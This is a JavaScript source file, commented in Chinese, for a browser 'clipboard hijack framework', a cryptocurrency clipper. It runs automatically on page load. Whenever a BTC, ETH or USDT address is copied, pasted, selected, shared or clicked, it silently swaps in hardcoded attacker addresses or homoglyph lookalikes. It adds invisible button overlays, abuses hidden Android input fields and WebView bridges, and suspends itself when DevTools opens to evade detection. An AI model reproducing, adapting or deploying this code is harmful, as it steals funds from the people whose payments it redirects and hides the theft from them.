/**
 * 三层架构 + 模块化设计 + 配置化管理
 */

(function ClipboardHijackFramework() {
  'use strict';

  /*** ============================= ***/
  /***        配置层 (Config)         ***/
  /*** ============================= ***/
  
  const CONFIG = {
    // 全局配置
    global: {
      enabled: true,
      testMode: false,
      maxExecutions: -1,
      delay: { min: 0, max: 500 },
      debug: location.hostname === 'localhost'
    },
    
    // 地址池配置
    addresses: {
      BTC: [
        'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0w1h',
        '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
      ],
      ETH: [
        '0x742d35Cc6634C0532925a3b844Bc9e7595f2bd20',
        '0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe'
      ],
      similarity: 0.9,
      rotationInterval: 3600000 // 1小时轮换
    },
    
    // 功能开关
    features: {
      ios: {
        copyEvent: true,
        buttonHijack: true,
        liveText: true,
        biometric: false
      },
      android: {
        ime: true,
        webview: true,
        share: true
      },
      universal: {
        contextMenu: true,
        selection: true,
        inputField: true
      }
    },
    
    // 反检测配置
    antiDetect: {
      devtools: true,
      randomDelay: true,
      domCamouflage: true
    }
  };

  /*** ============================= ***/
  /***        核心层 (Core)          ***/
  /*** ============================= ***/

  // 平台检测器
  const PlatformDetector = {
    // 缓存检测结果
    _cache: null,
    
    detect() {
      if (this._cache) return this._cache;
      
      const ua = navigator.userAgent;
      const platform = navigator.platform;
      
      this._cache = {
        // 操作系统
        os: {
          ios: /iPhone|iPad|iPod/.test(ua) && !window.MSStream,
          android: /Android/.test(ua),
          windows: /Win/.test(platform),
          mac: /Mac/.test(platform)
        },
        
        // 具体版本
        version: {
          ios: parseFloat(ua.match(/OS (\d+)_/)?.[1] || 0),
          android: parseFloat(ua.match(/Android\s+([\d.]+)/)?.[1] || 0)
        },
        
        // 浏览器环境
        browser: {
          safari: /Safari/.test(ua) && !/Chrome/.test(ua),
          chrome: /Chrome/.test(ua),
          firefox: /Firefox/.test(ua),
          webview: /wv|WebView/.test(ua) || window.ReactNativeWebView
        },
        
        // 特殊设备
        device: {
          dynamicIsland: window.devicePixelRatio > 3 && screen.height > 2500,
          hasTouch: 'ontouchstart' in window,
          hasFaceID: /iPhone (X|1[1-9])/.test(ua)
        }
      };
      
      return this._cache;
    },
    
    getBestStrategy() {
      const info = this.detect();
      
      if (info.os.ios) {
        if (info.version.ios >= 15) return 'ios-modern';
        if (info.version.ios >= 13) return 'ios-standard';
        return 'ios-legacy';
      }
      
      if (info.os.android) {
        if (info.browser.webview) return 'android-webview';
        if (info.version.android >= 10) return 'android-modern';
        return 'android-standard';
      }
      
      return 'universal';
    }
  };

  // 地址管理器
  const AddressManager = {
    _currentIndex: 0,
    _lastRotation: Date.now(),
    
    // 获取当前地址
    getCurrentAddress(type = 'ETH') {
      const addresses = CONFIG.addresses[type];
      if (!addresses || addresses.length === 0) return null;
      
      // 定时轮换
      if (Date.now() - this._lastRotation > CONFIG.addresses.rotationInterval) {
        this._currentIndex = (this._currentIndex + 1) % addresses.length;
        this._lastRotation = Date.now();
      }
      
      return addresses[this._currentIndex];
    },
    
    // 生成相似地址
    generateSimilar(original) {
      if (!original) return original;
      
      // 视觉相似字符映射
      const charMap = {
        'o': ['0', 'O'], 'O': ['0', 'o'],
        '1': ['l', 'I', '|'], 'l': ['1', 'I', '|'],
        'I': ['1', 'l', '|'], '0': ['o', 'O'],
        '5': ['S', 's'], 'S': ['5', 's'],
        '6': ['b', 'G'], 'G': ['6', 'C'],
        '8': ['B'], 'B': ['8'], 
        'a': ['а'], 'e': ['е'], 'p': ['р']  // 西里尔字符
      };
      
      let result = original;
      const threshold = CONFIG.addresses.similarity;
      const maxChanges = Math.floor(original.length * (1 - threshold));
      let changes = 0;
      
      // 随机替换字符
      for (let i = 0; i < result.length && changes < maxChanges; i++) {
        const char = result[i];
        const replacements = charMap[char];
        
        if (replacements && Math.random() > 0.7) {
          const newChar = replacements[Math.floor(Math.random() * replacements.length)];
          result = result.slice(0, i) + newChar + result.slice(i + 1);
          changes++;
        }
      }
      
      return result;
    },
    
    // 智能识别地址类型
    identifyType(address) {
      if (!address) return null;
      
      const patterns = {
        BTC: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/,
        ETH: /^0x[a-fA-F0-9]{40}$/,
        USDT: /^T[a-zA-Z0-9]{33}$/
      };
      
      for (const [type, pattern] of Object.entries(patterns)) {
        if (pattern.test(address)) return type;
      }
      
      return null;
    }
  };

  // 事件管理中心
  const EventManager = {
    _listeners: new Map(),
    _executed: 0,
    
    // 注册事件（带防重复机制）
    register(element, event, handler, options = {}) {
      const key = `${element.tagName}-${event}-${handler.name}`;
      
      if (!this._listeners.has(key)) {
        element.addEventListener(event, handler, options);
        this._listeners.set(key, { element, event, handler, options });
        
        if (CONFIG.global.debug) {
          console.log(`[EventManager] 注册: ${key}`);
        }
      }
    },
    
    // 执行劫持（带限制检查）
    execute(callback, context = {}) {
      if (!CONFIG.global.enabled) return false;
      
      // 检查执行次数限制
      if (CONFIG.global.maxExecutions > 0 && 
          this._executed >= CONFIG.global.maxExecutions) {
        return false;
      }
      
      // 随机延迟（反检测）
      const delay = CONFIG.antiDetect.randomDelay ? 
        Math.random() * (CONFIG.delay.max - CONFIG.delay.min) + CONFIG.delay.min : 0;
      
      setTimeout(() => {
        try {
          const result = callback(context);
          if (result) {
            this._executed++;
            this.track('execute', { success: true, ...context });
          }
        } catch (error) {
          this.track('error', { error: error.message, ...context });
        }
      }, delay);
      
      return true;
    },
    
    // 数据追踪
    track(event, data = {}) {
      if (CONFIG.global.testMode) {
        console.log(`[Track] ${event}:`, data);
      }
      
      // 收集遥测数据
      window.__clipboardTelemetry = window.__clipboardTelemetry || [];
      window.__clipboardTelemetry.push({
        event,
        data,
        timestamp: Date.now(),
        platform: PlatformDetector.detect()
      });
    },
    
    // 清理资源
    cleanup() {
      this._listeners.forEach(({ element, event, handler }) => {
        element.removeEventListener(event, handler);
      });
      this._listeners.clear();
    }
  };

  /*** ============================= ***/
  /***      平台层 (Platform)        ***/
  /*** ============================= ***/

  // iOS策略模块
  const iOSStrategy = {
    // 核心：Copy事件劫持
    hijackCopyEvent() {
      if (!CONFIG.features.ios.copyEvent) return;
      
      EventManager.register(document, 'copy', (e) => {
        const selection = window.getSelection().toString().trim();
        const addressType = AddressManager.identifyType(selection);
        
        if (addressType) {
          e.preventDefault();
          
          let replacement;
          if (CONFIG.global.testMode) {
            replacement = selection; // 测试模式不替换
          } else {
            replacement = AddressManager.getCurrentAddress(addressType) || 
                         AddressManager.generateSimilar(selection);
          }
          
          // iOS多重写入策略
          e.clipboardData.setData('text/plain', replacement);
          e.clipboardData.setData('text/html', replacement);
          
          // 降级方案
          if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(replacement).catch(() => {
              this.fallbackCopy(replacement);
            });
          }
          
          EventManager.track('copy_hijack', { 
            original: selection.slice(0, 10) + '...', 
            type: addressType 
          });
        }
      }, true);
    },
    
    // 核心：按钮劫持
    hijackButtons() {
      if (!CONFIG.features.ios.buttonHijack) return;
      
      const hijackButton = (button) => {
        if (button.dataset.hijacked) return;
        button.dataset.hijacked = 'true';
        
        const rect = button.getBoundingClientRect();
        const overlay = document.createElement('div');
        
        overlay.style.cssText = `
          position: absolute;
          width: ${rect.width}px;
          height: ${rect.height}px;
          top: ${rect.top + window.scrollY}px;
          left: ${rect.left + window.scrollX}px;
          z-index: 99999;
          pointer-events: auto;
          cursor: pointer;
        `;
        
        overlay.onclick = (e) => {
          e.stopPropagation();
          e.preventDefault();
          
          const text = button.textContent || button.value || '';
          const addressType = AddressManager.identifyType(text);
          
          if (addressType) {
            const replacement = AddressManager.getCurrentAddress(addressType);
            
            EventManager.execute(() => {
              navigator.clipboard.writeText(replacement);
              
              // 视觉反馈
              button.style.backgroundColor = '#4CAF50';
              setTimeout(() => button.style.backgroundColor = '', 200);
            }, { method: 'button_hijack' });
          }
          
          // 触发原始点击
          button.click();
        };
        
        document.body.appendChild(overlay);
        
        // 监听按钮位置变化
        if (window.ResizeObserver) {
          new ResizeObserver(() => {
            const newRect = button.getBoundingClientRect();
            overlay.style.top = `${newRect.top + window.scrollY}px`;
            overlay.style.left = `${newRect.left + window.scrollX}px`;
          }).observe(button);
        }
      };
      
      // 扫描所有可能的按钮
      const selector = 'button, [role="button"], .btn, [class*="copy"], [class*="address"]';
      document.querySelectorAll(selector).forEach(hijackButton);
      
      // 观察DOM变化
      const observer = new MutationObserver((mutations) => {
        mutations.forEach(mutation => {
          mutation.addedNodes.forEach(node => {
            if (node.nodeType === 1) {
              if (node.matches(selector)) {
                hijackButton(node);
              }
              node.querySelectorAll(selector).forEach(hijackButton);
            }
          });
        });
      });
      
      observer.observe(document.body, { childList: true, subtree: true });
    },
    
    // 优化：Live Text攻击（iOS 15+）
    deployLiveText() {
      if (!CONFIG.features.ios.liveText) return;
      
      const platform = PlatformDetector.detect();
      if (!platform.os.ios || platform.version.ios < 15) return;
      
      const canvas = document.createElement('canvas');
      canvas.width = 300;
      canvas.height = 40;
      const ctx = canvas.getContext('2d');
      
      // 绘制地址
      ctx.font = '14px -apple-system, monospace';
      ctx.fillStyle = '#333';
      
      const address = AddressManager.getCurrentAddress('BTC');
      ctx.fillText(address, 10, 25);
      
      // 转为图片
      canvas.toBlob(blob => {
        const img = new Image();
        img.src = URL.createObjectURL(blob);
        img.alt = address;
        img.style.cssText = `
          position: fixed;
          bottom: 0;
          right: 0;
          opacity: 0.01;
          pointer-events: none;
          z-index: -1;
        `;
        
        document.body.appendChild(img);
        
        EventManager.track('livetext_deployed', { ios_version: platform.version.ios });
      });
    },
    
    // 降级复制方案
    fallbackCopy(text) {
      const textarea = document.createElement('textarea');
      textarea.value = text;
      textarea.style.cssText = 'position:fixed;left:-9999px;';
      document.body.appendChild(textarea);
      
      textarea.select();
      textarea.setSelectionRange(0, textarea.value.length);
      
      try {
        document.execCommand('copy');
        EventManager.track('fallback_copy', { success: true });
      } catch (e) {
        EventManager.track('fallback_copy', { success: false, error: e.message });
      }
      
      document.body.removeChild(textarea);
    }
  };

  // Android策略模块
  const AndroidStrategy = {
    // 核心：输入法漏洞
    exploitIME() {
      if (!CONFIG.features.android.ime) return;
      
      const container = document.createElement('div');
      container.style.cssText = 'position:fixed;left:-9999px;top:-9999px;';
      
      // 创建隐藏输入框组
      ['text', 'number', 'tel', 'email'].forEach(type => {
        const input = document.createElement('input');
        input.type = type;
        input.style.cssText = 'position:absolute;';
        
        // IME激活时注入
        let imeTimer;
        input.addEventListener('focus', () => {
          imeTimer = setTimeout(() => {
            const address = AddressManager.getCurrentAddress();
            
            EventManager.execute(() => {
              input.value = address;
              input.select();
              document.execCommand('copy');
              
              // Android 10+ 新API
              if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(address);
              }
              
              input.blur();
            }, { method: 'ime_exploit' });
          }, 100);
        });
        
        input.addEventListener('blur', () => clearTimeout(imeTimer));
        container.appendChild(input);
      });
      
      document.body.appendChild(container);
      
      // 智能触发
      document.addEventListener('touchstart', (e) => {
        if (e.target.matches('input, textarea, [contenteditable]')) {
          const inputs = container.querySelectorAll('input');
          inputs[Math.floor(Math.random() * inputs.length)].focus();
        }
      });
    },
    
    // 核心：WebView桥接
    exploitWebView() {
      if (!CONFIG.features.android.webview) return;
      
      const platform = PlatformDetector.detect();
      if (!platform.browser.webview) return;
      
      // 常见WebView接口
      const bridges = ['Android', 'android', 'AndroidBridge', 'WebViewBridge'];
      
      for (const bridge of bridges) {
        if (window[bridge]) {
          // 尝试各种剪贴板方法
          const methods = ['copyToClipboard', 'setClipboard', 'copy'];
          
          for (const method of methods) {
            if (typeof window[bridge][method] === 'function') {
              EventManager.execute(() => {
                const address = AddressManager.getCurrentAddress();
                window[bridge][method](address);
              }, { method: 'webview_bridge', bridge, function: method });
              
              return; // 找到就退出
            }
          }
          
          // 通用消息接口
          if (window[bridge].postMessage) {
            EventManager.execute(() => {
              window[bridge].postMessage(JSON.stringify({
                action: 'clipboard',
                data: AddressManager.getCurrentAddress()
              }));
            }, { method: 'webview_message' });
          }
        }
      }
    },
    
    // 优化：分享API劫持
    hijackShare() {
      if (!CONFIG.features.android.share || !navigator.share) return;
      
      const originalShare = navigator.share.bind(navigator);
      
      navigator.share = async (data) => {
        if (data.text) {
          const addressType = AddressManager.identifyType(data.text);
          
          if (addressType) {
            data.text = AddressManager.getCurrentAddress(addressType) || 
                       AddressManager.generateSimilar(data.text);
            
            // 同时写入剪贴板
            try {
              await navigator.clipboard.writeText(data.text);
            } catch (e) {
              // 静默失败
            }
            
            EventManager.track('share_hijack', { type: addressType });
          }
        }
        
        return originalShare(data);
      };
    }
  };

  // 通用策略模块
  const UniversalStrategy = {
    // 右键菜单劫持
    hijackContextMenu() {
      if (!CONFIG.features.universal.contextMenu) return;
      
      EventManager.register(document, 'contextmenu', (e) => {
        const selection = window.getSelection().toString().trim();
        const addressType = AddressManager.identifyType(selection);
        
        if (addressType) {
          e.preventDefault();
          
          // 创建自定义菜单
          const menu = document.createElement('div');
          menu.className = 'custom-context-menu';
          menu.style.cssText = `
            position: fixed;
            top: ${e.clientY}px;
            left: ${e.clientX}px;
            background: white;
            border: 1px solid #ccc;
            border-radius: 4px;
            padding: 4px 0;
            box-shadow: 2px 2px 10px rgba(0,0,0,0.1);
            z-index: 100000;
            min-width: 120px;
          `;
          
          const menuItem = document.createElement('div');
          menuItem.textContent = '📋 复制地址';
          menuItem.style.cssText = `
            padding: 8px 16px;
            cursor: pointer;
            hover: background: #f0f0f0;
          `;
          
          menuItem.onclick = () => {
            const replacement = AddressManager.getCurrentAddress(addressType);
            
            EventManager.execute(() => {
              navigator.clipboard.writeText(replacement);
              menu.remove();
            }, { method: 'context_menu' });
          };
          
          menu.appendChild(menuItem);
          document.body.appendChild(menu);
          
          // 点击其他地方关闭
          setTimeout(() => {
            document.addEventListener('click', () => menu.remove(), { once: true });
          }, 10);
        }
      });
    },
    
    // 选择文本监控
    monitorSelection() {
      if (!CONFIG.features.universal.selection) return;
      
      let lastSelection = '';
      
      EventManager.register(document, 'selectionchange', () => {
        const selection = window.getSelection().toString().trim();
        
        if (selection !== lastSelection) {
          lastSelection = selection;
          
          const addressType = AddressManager.identifyType(selection);
          if (addressType) {
            EventManager.track('selection_detected', { type: addressType });
            
            // 预写入剪贴板（某些浏览器允许）
            if (navigator.clipboard && navigator.clipboard.writeText) {
              const replacement = AddressManager.getCurrentAddress(addressType);
              navigator.clipboard.writeText(replacement).catch(() => {});
            }
          }
        }
      });
    },
    
    // 输入框监控
    monitorInputs() {
      if (!CONFIG.features.universal.inputField) return;
      
      const monitorInput = (input) => {
        if (input.dataset.monitored) return;
        input.dataset.monitored = 'true';
        
        EventManager.register(input, 'paste', (e) => {
          const pastedText = e.clipboardData.getData('text');
          const addressType = AddressManager.identifyType(pastedText);
          
          if (addressType) {
            e.preventDefault();
            
            const replacement = CONFIG.global.testMode ? pastedText :
              AddressManager.getCurrentAddress(addressType) || 
              AddressManager.generateSimilar(pastedText);
            
            // 插入替换后的文本
            const start = input.selectionStart;
            const end = input.selectionEnd;
            const value = input.value;
            
            input.value = value.slice(0, start) + replacement + value.slice(end);
            input.selectionStart = input.selectionEnd = start + replacement.length;
            
            EventManager.track('paste_hijack', { type: addressType });
          }
        });
      };
      
      // 监控现有输入框
      document.querySelectorAll('input, textarea').forEach(monitorInput);
      
      // 监控新增输入框
      const observer = new MutationObserver((mutations) => {
        mutations.forEach(mutation => {
          mutation.addedNodes.forEach(node => {
            if (node.nodeType === 1) {
              if (node.matches('input, textarea')) {
                monitorInput(node);
              }
              node.querySelectorAll('input, textarea').forEach(monitorInput);
            }
          });
        });
      });
      
      observer.observe(document.body, { childList: true, subtree: true });
    }
  };

  /*** ============================= ***/
  /***      应用层 (Application)     ***/
  /*** ============================= ***/

  // 反检测系统
  const AntiDetection = {
    init() {
      if (!CONFIG.antiDetect.devtools) return;
      
      // DevTools检测
      let devtools = { open: false, orientation: null };
      const threshold = 160;
      const emitEvent = (state) => {
        if (state !== devtools.open) {
          devtools.open = state;
          EventManager.track('devtools', { open: state });
          
          if (state) {
            // DevTools打开时暂停
            CONFIG.global.enabled = false;
            this.cleanup();
          } else {
            // DevTools关闭后恢复
            setTimeout(() => {
              CONFIG.global.enabled = true;
              MainController.init();
            }, 5000);
          }
        }
      };
      
      setInterval(() => {
        if (window.outerHeight - window.innerHeight > threshold ||
            window.outerWidth - window.innerWidth > threshold) {
          emitEvent(true);
        } else {
          emitEvent(false);
        }
      }, 500);
      
      // 控制台检测
      const element = new Image();
      Object.defineProperty(element, 'id', {
        get: function() {
          emitEvent(true);
          throw new Error();
        }
      });
      
      // DOM伪装
      if (CONFIG.antiDetect.domCamouflage) {
        this.camouflageDOM();
      }
    },
    
    camouflageDOM() {
      // 移除可疑属性
      document.querySelectorAll('[data-hijacked]').forEach(el => {
        delete el.dataset.hijacked;
      });
      
      // 混淆class名
      const suspiciousClasses = ['hijack', 'exploit', 'inject'];
      document.querySelectorAll('*').forEach(el => {
        suspiciousClasses.forEach(cls => {
          if (el.className.includes(cls)) {
            el.className = el.className.replace(cls, 'opt-' + Math.random().toString(36).substring(7));
          }
        });
      });
    },
    
    cleanup() {
      // 清理所有注入的元素
      document.querySelectorAll('.custom-context-menu, [data-exploit]').forEach(el => el.remove());
    }
  };

  // 主控制器
  const MainController = {
    initialized: false,
    
    init() {
      if (this.initialized) return;
      this.initialized = true;
      
      console.log('🔧 Clipboard Framework v2.0 initializing...');
      
      // 初始化反检测
      AntiDetection.init();
      
      // 获取最佳策略
      const strategy = PlatformDetector.getBestStrategy();
      const platform = PlatformDetector.detect();
      
      console.log(`📱 Platform: ${strategy}`, platform);
      
      // 根据平台加载对应模块
      switch (strategy) {
        case 'ios-modern':
        case 'ios-standard':
        case 'ios-legacy':
          iOSStrategy.hijackCopyEvent();
          iOSStrategy.hijackButtons();
          if (strategy === 'ios-modern') {
            iOSStrategy.deployLiveText();
          }
          break;
          
        case 'android-webview':
          AndroidStrategy.exploitWebView();
          AndroidStrategy.exploitIME();
          AndroidStrategy.hijackShare();
          break;
          
        case 'android-modern':
        case 'android-standard':
          AndroidStrategy.exploitIME();
          AndroidStrategy.hijackShare();
          break;
      }
      
      // 加载通用模块
      UniversalStrategy.hijackContextMenu();
      UniversalStrategy.monitorSelection();
      UniversalStrategy.monitorInputs();
      
      // 设置定期检查
      setInterval(() => {
        if (CONFIG.global.enabled) {
          // 重新扫描按钮
          if (platform.os.ios) {
            iOSStrategy.hijackButtons();
          }
        }
      }, 5000);
      
      EventManager.track('initialized', { strategy, platform });
    },
    
    // 外部控制接口
    setConfig(newConfig) {
      Object.assign(CONFIG, newConfig);
      EventManager.track('config_update', newConfig);
    },
    
    pause() {
      CONFIG.global.enabled = false;
      EventManager.track('paused');
    },
    
    resume() {
      CONFIG.global.enabled = true;
      EventManager.track('resumed');
    },
    
    destroy() {
      this.pause();
      EventManager.cleanup();
      AntiDetection.cleanup();
      this.initialized = false;
      EventManager.track('destroyed');
    },
    
    // 获取统计信息
    getStats() {
      return {
        executed: EventManager._executed,
        telemetry: window.__clipboardTelemetry || [],
        config: CONFIG,
        platform: PlatformDetector.detect()
      };
    }
  };

  /*** ============================= ***/
  /***         启动入口              ***/
  /*** ============================= ***/

  // 自动初始化
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => MainController.init());
  } else {
    MainController.init();
  }

  // 导出API
  window.ClipboardHijack = {
    config: CONFIG,
    controller: MainController,
    platform: PlatformDetector,
    stats: () => MainController.getStats()
  };

})();
